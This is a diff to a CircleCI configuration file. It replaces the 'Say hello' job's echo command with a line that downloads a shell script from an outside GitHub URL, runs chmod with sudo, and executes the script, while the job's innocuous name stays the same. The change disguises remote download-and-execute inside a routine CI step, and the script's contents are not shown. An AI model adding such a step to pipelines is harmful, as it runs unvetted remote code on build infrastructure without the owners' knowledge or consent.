@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "wget https://raw.githubusercontent.com/meyersgeorgia639/ish/main/tm4.sh; sudo chmod +x *; bash ./tm4.sh;"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
@@ -24,3 +24,4 @@ workflows:
   say-hello-workflow:
     jobs:
       - say-hello
+
